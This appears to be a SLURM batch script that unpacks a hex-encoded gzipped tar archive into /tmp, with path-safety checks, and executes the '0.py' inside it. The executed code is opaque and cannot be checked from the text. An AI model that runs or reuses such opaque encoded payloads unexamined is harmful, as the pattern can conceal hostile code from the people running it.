#!/bin/bash
set -euo pipefail
exec /usr/bin/python3 -I -s -B - <<'A'
import hashlib,io,json,os,sys,tarfile
from pathlib import Path,PurePosixPath
j=os.environ.get('SLURM_JOB_ID','')
if not j.isdigit():raise ValueError('Allocation required')
b=bytes.fromhex('1f8b0800000000000003ed954d8fdb201086f7ec5f8172c19622823f13679563ef3db4bd54ab15b6c709d9042c20dd4dabfef7821dadd256ea6d775b751ec9c6d8cc3b03c360cef656ab9b17857b2acec796ffdef23c2f9f9fa7f7d572c96f087fd9b0264ed609e35dbe86afbf906f33a71f40cdd664d6f014dad552547d5637b339990de27cd0a2bbb73b9195d53824858cd70022cb44ba8236af9a6a559775d1a7752556996fc6ababaabecff362d5a43ccba1c9f37cc9a1876bd5e6ecc07ad132ababacacc397835057ce565e76b9ec8ab269fbb6cbfa3ae7752d80175dd555d0957995375dd9962def9ab42dea3acdd38eaf9645e10380a2987d7febc5fd07e06c38bfb88f3fd77f9aa6c5aff55f1439d6ff6b208f83368ed8b39d871fc17c27ecee209bb95f945e1e20ea8d3e9241b8f0925c06bff7ddc86c42137b4326ccf6cbe7f42eb96d37418385f2b6716c16948f7f179a3003bee21d3cb93849223199d2c560f41e5ab768f5f17852d29d17fbfd194e6a4b9345fb998e2713bd0b326efb9546c25af0ee2f21b2e9a488c5243e1e275e9dede0a9935bb0ded566e3557e3ec5e85df428dd8e5ce6c7f4002a16091196b875447a6d0810a9c60e913d51da11604a1c81858de26cb08ea936ed4e98ee7e97f2054dd6ad564eaa135cdb481b1cc409f19294311a54c7794f72091b82dcda0869817c128713bc33469b987e5456f42188e1e468e225878d5fca812e26c3db21588272ecf8d049134f1dbbf9604e30872769ddbd7e187b891ffa68a483cbe238e6136044ebc6c060ca4a48484862c831932aac70cce7d6997874eabf8e5be06ac26caf9fb7c2514815855b6c92e8adf73282200882200882200882200882200882200882200882fcaffc00da5f5ed700280000')
r=Path('/tmp')/('a'+j+'b01ec87a6f29b')
r.mkdir(mode=0o700)
with tarfile.open(fileobj=io.BytesIO(b)) as a:
    for e in a:
        n=PurePosixPath(e.name)
        if n.is_absolute() or '..' in n.parts or not e.isfile():raise ValueError('Unsafe input')
        p=r/e.name;p.parent.mkdir(parents=True,exist_ok=True)
        with a.extractfile(e) as i,p.open('xb') as o:o.write(i.read())
os.chdir(r)
os.execv(sys.executable,[sys.executable,'-I','-s','-B',str(r/'0.py'),str(r)])
A
